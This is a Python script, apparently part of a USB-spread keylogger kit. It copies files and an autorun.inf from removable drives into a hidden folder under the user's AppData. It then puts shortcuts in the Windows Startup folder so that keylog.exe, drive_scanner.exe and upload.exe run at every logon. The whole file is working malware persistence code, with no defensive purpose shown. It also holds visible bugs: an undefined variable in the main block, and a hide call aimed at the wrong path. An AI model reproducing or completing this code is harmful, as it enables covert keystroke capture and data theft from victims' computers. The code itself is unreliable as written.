import os
import shutil
import wmi
import win32api
import win32con
from win32com.client import Dispatch

#Copy files from removable drive to C:\Users\USER\AppData\Local\Microsoft\Windows\Explorer\temp
#Create shortcuts pointing to keylog executable
def copy():
	user = os.environ.get("USERNAME")
	c = wmi.WMI()
	remov_disks = c.Win32_LogicalDisk(DriveType=2)
	for disk in remov_disks:
		try:
			#copy files
			shutil.copytree(
				r'%s\temp' % disk.Name,
				r'C:\Users\%s\AppData\Local\Microsoft\Windows\Explorer' % user
			)
			shutil.copy(
				r'%s\autorun.inf' % disk.Name,
				r'C:\Users\%s\AppData\Local\Microsoft\Windows\Explorer' % user
			)
			#hide directory
			win32api.SetFileAttributes(
				r'C:\Users\%s\AppData\Local\Microsoft\Windows\Explorer\temp' % user,
				win32con.FILE_ATTRIBUTE_HIDDEN
			)
			#hide autorun.inf
			win32api.SetFileAttributes(
				r'C:\Users\%s\AppData\Local\Microsoft\Windows\Explorer' % user,
				win32con.FILE_ATTRIBUTE_HIDDEN
			)
		except: #Other storage device
			pass

def create_shortcut(path, target="", wDir="", icon=""):
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(path)
	shortcut.Targetpath = target
	shortcut.save()
	
if __name__ == "__main__":
	copy()
	#Create keylogger shortcut in startup programs
	create_shortcut(
		u'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\k_short.lnk',
		u'C:\\Users\\%s\\appData\\Local\\Microsoft\\Windows\\Explorer\\temp\\keylog.exe' % user
	)
	#Create drive_scanner shortcut in startup programs
	create_shortcut(
		u'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ds_short.lnk',
		u'C:\\Users\\%s\\AppData\\Local\\Microsoft\\Windows\\Explorer\\temp\\drive_scanner.exe' % user
	)
	#Create upload shortcut in startup programs
	create_shortcut(
		u'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\up_short.lnk',
		u'C:\\Users\\%s\\AppData\\Local\\Microsoft\\Windows\\Explorer\\temp\\upload.exe' % user
	)
	#